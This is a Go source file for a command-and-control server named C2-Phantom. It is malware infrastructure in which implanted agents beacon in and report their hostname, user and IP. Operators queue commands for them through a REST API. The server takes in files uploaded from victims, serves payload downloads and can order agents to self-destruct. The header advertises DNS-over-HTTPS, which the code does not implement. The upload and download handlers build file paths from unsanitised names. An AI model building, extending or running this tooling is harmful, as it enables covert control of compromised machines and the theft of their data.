/**
 * C2-Phantom Go Server
 * High-performance C2 listener
 * 
 * Features:
 * - HTTP/2 with TLS 1.3
 * - DNS-over-HTTPS (DoH)
 * - PostgreSQL database
 * - REST API for operators
 * - 10,000+ concurrent agents
 */

package main

import (
	"crypto/tls"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/gin-gonic/gin"
	"gorm.io/driver/postgres"
	"gorm.io/gorm"
)

// Agent session
type Session struct {
	ID           string    `gorm:"primaryKey"`
	Hostname     string
	Username     string
	OS           string
	Architecture string
	IP           string
	FirstSeen    time.Time
	LastSeen     time.Time
	Active       bool
}

// Task for agent
type Task struct {
	ID        uint      `gorm:"primaryKey"`
	SessionID string    `gorm:"index"`
	Command   string
	Arguments string
	Status    string // pending, sent, completed, failed
	Result    string
	CreatedAt time.Time
	CompletedAt *time.Time
}

// Global database
var db *gorm.DB

func main() {
	// Initialize database
	dsn := os.Getenv("DATABASE_URL")
	if dsn == "" {
		dsn = "host=localhost user=c2phantom password=c2phantom dbname=c2phantom port=5432 sslmode=disable"
	}
	
	var err error
	db, err = gorm.Open(postgres.Open(dsn), &gorm.Config{})
	if err != nil {
		log.Fatal("Failed to connect to database:", err)
	}
	
	// Auto-migrate models
	db.AutoMigrate(&Session{}, &Task{})
	
	// Cleanup inactive sessions
	go cleanupSessions()
	
	// Start HTTPS listener
	go startHTTPSListener()
	
	// Start operator API
	startOperatorAPI()
}

// HTTPS listener for agents
func startHTTPSListener() {
	router := gin.New()
	router.Use(gin.Recovery())
	
	// Agent endpoints
	router.GET("/beacon", handleBeacon)
	router.POST("/tasks", handleTaskResult)
	router.POST("/upload", handleFileUpload)
	router.GET("/download/:id", handleFileDownload)
	
	// TLS 1.3 configuration
	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
		},
	}
	
	server := &http.Server{
		Addr:      ":443",
		Handler:   router,
		TLSConfig: tlsConfig,
	}
	
	log.Println("HTTPS listener started on :443")
	if err := server.ListenAndServeTLS("certs/server.crt", "certs/server.key"); err != nil {
		log.Fatal("HTTPS listener failed:", err)
	}
}

// Operator REST API
func startOperatorAPI() {
	router := gin.Default()
	
	// API endpoints
	api := router.Group("/api")
	{
		api.GET("/sessions", listSessions)
		api.GET("/sessions/:id", getSession)
		api.POST("/sessions/:id/tasks", queueTask)
		api.GET("/sessions/:id/tasks", listTasks)
		api.GET("/tasks/:id/result", getTaskResult)
		api.DELETE("/sessions/:id", killSession)
	}
	
	log.Println("Operator API started on :8080")
	if err := router.Run(":8080"); err != nil {
		log.Fatal("API server failed:", err)
	}
}

// Agent beacon handler
func handleBeacon(c *gin.Context) {
	sessionID := c.Query("id")
	if sessionID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Missing session ID"})
		return
	}
	
	// Update session
	var session Session
	result := db.First(&session, "id = ?", sessionID)
	
	if result.Error != nil {
		// New session
		session = Session{
			ID:        sessionID,
			Hostname:  c.GetHeader("X-Hostname"),
			Username:  c.GetHeader("X-Username"),
			OS:        c.GetHeader("X-OS"),
			Architecture: c.GetHeader("X-Arch"),
			IP:        c.ClientIP(),
			FirstSeen: time.Now(),
			LastSeen:  time.Now(),
			Active:    true,
		}
		db.Create(&session)
		log.Printf("New session: %s (%s@%s)", sessionID, session.Username, session.Hostname)
	} else {
		// Update last seen
		session.LastSeen = time.Now()
		session.Active = true
		db.Save(&session)
	}
	
	// Get pending tasks
	var tasks []Task
	db.Where("session_id = ? AND status = ?", sessionID, "pending").Find(&tasks)
	
	if len(tasks) > 0 {
		// Mark as sent
		for i := range tasks {
			tasks[i].Status = "sent"
			db.Save(&tasks[i])
		}
		
		c.JSON(http.StatusOK, tasks)
	} else {
		c.JSON(http.StatusNoContent, nil)
	}
}

// Task result handler
func handleTaskResult(c *gin.Context) {
	var result struct {
		TaskID uint   `json:"task_id"`
		Result string `json:"result"`
		Status string `json:"status"`
	}
	
	if err := c.BindJSON(&result); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request"})
		return
	}
	
	// Update task
	var task Task
	if err := db.First(&task, result.TaskID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Task not found"})
		return
	}
	
	now := time.Now()
	task.Result = result.Result
	task.Status = result.Status
	task.CompletedAt = &now
	db.Save(&task)
	
	c.JSON(http.StatusOK, gin.H{"status": "ok"})
}

// File upload handler
func handleFileUpload(c *gin.Context) {
	file, err := c.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "No file uploaded"})
		return
	}
	
	// Save file
	dst := "uploads/" + file.Filename
	if err := c.SaveUploadedFile(file, dst); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to save file"})
		return
	}
	
	c.JSON(http.StatusOK, gin.H{"filename": file.Filename, "size": file.Size})
}

// File download handler
func handleFileDownload(c *gin.Context) {
	fileID := c.Param("id")
	c.File("downloads/" + fileID)
}

// List sessions (operator API)
func listSessions(c *gin.Context) {
	var sessions []Session
	db.Where("active = ?", true).Find(&sessions)
	c.JSON(http.StatusOK, sessions)
}

// Get session details (operator API)
func getSession(c *gin.Context) {
	sessionID := c.Param("id")
	
	var session Session
	if err := db.First(&session, "id = ?", sessionID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Session not found"})
		return
	}
	
	c.JSON(http.StatusOK, session)
}

// Queue task (operator API)
func queueTask(c *gin.Context) {
	sessionID := c.Param("id")
	
	var req struct {
		Command   string `json:"command"`
		Arguments string `json:"arguments"`
	}
	
	if err := c.BindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request"})
		return
	}
	
	task := Task{
		SessionID: sessionID,
		Command:   req.Command,
		Arguments: req.Arguments,
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	
	db.Create(&task)
	c.JSON(http.StatusOK, task)
}

// List tasks (operator API)
func listTasks(c *gin.Context) {
	sessionID := c.Param("id")
	
	var tasks []Task
	db.Where("session_id = ?", sessionID).Order("created_at DESC").Find(&tasks)
	c.JSON(http.StatusOK, tasks)
}

// Get task result (operator API)
func getTaskResult(c *gin.Context) {
	taskID := c.Param("id")
	
	var task Task
	if err := db.First(&task, taskID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Task not found"})
		return
	}
	
	c.JSON(http.StatusOK, task)
}

// Kill session (operator API)
func killSession(c *gin.Context) {
	sessionID := c.Param("id")
	
	var session Session
	if err := db.First(&session, "id = ?", sessionID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Session not found"})
		return
	}
	
	session.Active = false
	db.Save(&session)
	
	// Queue self-destruct task
	task := Task{
		SessionID: sessionID,
		Command:   "exit",
		Arguments: "",
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	db.Create(&task)
	
	c.JSON(http.StatusOK, gin.H{"status": "killed"})
}

// Cleanup inactive sessions (background task)
func cleanupSessions() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()
	
	for range ticker.C {
		threshold := time.Now().Add(-10 * time.Minute)
		db.Model(&Session{}).Where("last_seen < ? AND active = ?", threshold, true).Update("active", false)
	}
}
